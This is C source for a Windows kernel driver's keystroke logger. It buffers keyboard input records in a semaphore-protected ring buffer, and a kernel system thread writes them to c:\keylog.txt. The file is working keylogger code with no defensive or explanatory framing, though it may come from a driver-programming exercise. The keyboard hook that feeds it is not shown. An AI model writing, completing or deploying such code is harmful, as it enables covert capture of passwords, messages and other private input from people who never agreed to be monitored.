#include <ntddk.h>
#include <Ntstrsafe.h>
#include <ntddkbd.h>
#include "driver.h"

#define BUF_LEN 200
HANDLE g_hLogFile = NULL;
KEVENT g_stopEvent;
PKTHREAD g_thread = NULL;
KEYBOARD_INPUT_DATA g_dataBuff[BUF_LEN];
KSEMAPHORE g_mutex;
KSEMAPHORE g_takenSemaphore;
KSEMAPHORE g_emtpySemaphore;
int g_dataIn = 0;
int g_dataOut = 0;

NTSTATUS WriteKeyboardInputData(PKEYBOARD_INPUT_DATA pkid, ULONG size)
{
	NTSTATUS status;
	PVOID keke[2];
	keke[0] = &g_emtpySemaphore;
	keke[1] = &g_stopEvent;

	for (ULONG i = 0; i < size; ++i) {
		status = KeWaitForMultipleObjects(2, keke, WaitAny, Executive, KernelMode, FALSE, NULL, NULL);
		if (status == STATUS_WAIT_1) {
			break;
		}
		KeWaitForSingleObject(&g_mutex, Executive, KernelMode, FALSE, NULL);

		g_dataBuff[g_dataIn] = pkid[i];
		g_dataIn = (g_dataIn + 1) % BUF_LEN;

		KeReleaseSemaphore(&g_mutex, 0, 1, FALSE);
		KeReleaseSemaphore(&g_takenSemaphore, 0, 1, FALSE);
	}
	return STATUS_SUCCESS;
}

VOID LogThread(PVOID StartContext)
{
	UNREFERENCED_PARAMETER(StartContext);
	LARGE_INTEGER offset = RtlConvertLongToLargeInteger(0);
	NTSTATUS status = STATUS_SUCCESS;
	KEYBOARD_INPUT_DATA kid;
	PVOID keke[2];
	keke[0] = &g_takenSemaphore;
	keke[1] = &g_stopEvent;

	while (TRUE) {
		status = KeWaitForMultipleObjects(2, keke, WaitAny, Executive, KernelMode, FALSE, NULL, NULL);
		if (status == STATUS_WAIT_1) {
			break;
		}
		KeWaitForSingleObject(&g_mutex, Executive, KernelMode, FALSE, NULL);

		kid = g_dataBuff[g_dataOut];
		g_dataOut = (g_dataOut + 1) % BUF_LEN;

		KeReleaseSemaphore(&g_mutex, 0, 1, FALSE);
		KeReleaseSemaphore(&g_emtpySemaphore, 0, 1, FALSE);

		IO_STATUS_BLOCK isb;
		status = ZwWriteFile(g_hLogFile, NULL, NULL, NULL, &isb, &kid, sizeof(kid), &offset, NULL);
		if (!NT_SUCCESS(status)) {
			//break;
		} else {
			offset.QuadPart += (ULONG)isb.Information;
		}
	}
	ZwClose(g_hLogFile);
	PsTerminateSystemThread(STATUS_SUCCESS);
}

NTSTATUS CreateLogFile()
{
	UNICODE_STRING filePath = RTL_CONSTANT_STRING(L"\\??\\c:\\keylog.txt");
	OBJECT_ATTRIBUTES oa;
	oa.Length = sizeof(OBJECT_ATTRIBUTES);
	oa.RootDirectory = NULL;
	oa.SecurityDescriptor = NULL;
	oa.SecurityQualityOfService = NULL;
	oa.ObjectName = &filePath;

	IO_STATUS_BLOCK isb;
	NTSTATUS status = ZwCreateFile(&g_hLogFile, GENERIC_WRITE, &oa, &isb, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ,
		FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE | FILE_RANDOM_ACCESS,
		NULL, 0);
	if (!NT_SUCCESS(status)) {
		KdPrint(("failed to create c:\\keylog.txt"));
		return status;
	}
	return status;
}

NTSTATUS InitLogger()
{
	NTSTATUS status;
	status = CreateLogFile();
	if (!NT_SUCCESS(status))
		return status;

	HANDLE hThread;
	KeInitializeEvent(&g_stopEvent, NotificationEvent, FALSE);
	KeInitializeSemaphore(&g_mutex, 1, 1);
	KeInitializeSemaphore(&g_takenSemaphore, 0, BUF_LEN);
	KeInitializeSemaphore(&g_emtpySemaphore, BUF_LEN, BUF_LEN);
	status = PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, &LogThread, NULL);
	if (!NT_SUCCESS(status))
		return status;
	ObReferenceObjectByHandle(hThread, THREAD_ALL_ACCESS, NULL, KernelMode, &g_thread, NULL);
	ZwClose(hThread);
	return STATUS_SUCCESS;
}

NTSTATUS UninitLogger()
{
	KeSetEvent(&g_stopEvent, 0, TRUE);
	KeWaitForSingleObject(g_thread, Executive, KernelMode, FALSE, NULL);
	ObDereferenceObject(g_thread);
	return STATUS_SUCCESS;
}
